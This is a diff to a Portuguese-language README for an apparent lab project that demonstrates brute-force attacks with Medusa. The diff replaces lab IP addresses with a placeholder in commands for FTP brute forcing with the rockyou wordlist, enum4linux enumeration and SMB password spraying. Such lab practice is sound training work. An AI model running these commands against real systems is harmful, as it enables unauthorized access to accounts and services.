@@ -20,7 +20,7 @@ Este projeto demonstra a execução de ataques de **força bruta** utilizando a 
 ## ✅ Cenários Testados
 1. **Ataque de Força Bruta em FTP**
    ```bash
-   medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp
+   medusa -h (IP) -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp
 
 2. **Automação em Formulário Web (DVWA)**
 
@@ -28,8 +28,8 @@ Este projeto demonstra a execução de ataques de **força bruta** utilizando a 
 
 4. **Password Spraying em SMB com Enumeração**
    ```bash
-   enum4linux -a 192.168.56.101
-   medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt
+   enum4linux -a (IP)
+   medusa -h (IP) -U users.txt -P password.txt -M smbnt
    ```
 ---
 
